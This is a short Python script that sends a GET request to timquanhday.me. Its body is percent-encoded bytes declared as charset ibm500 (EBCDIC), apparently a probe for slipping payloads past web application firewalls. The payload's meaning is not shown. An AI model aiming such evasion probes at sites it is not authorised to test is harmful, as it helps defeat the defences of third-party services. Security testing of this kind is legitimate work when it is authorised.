#!/usr/bin/python

import httplib
import urllib
import requests

url = 'https://timquanhday.me'
mdata = '%14%BD%B3%BC%B9%BA%BE%9E%2F%25%B5%BC%BE%88%82%B0%AB%AB%82%89%14%07%BD%B3%BC%B9%BA%BE%9E'
mheaders = {'content-type': 'application/x-www-form-urlencoded; charset=ibm500', 'content-length': str(len(mdata))}
r = requests.get(url, headers=mheaders, data=mdata)
print(r.text)
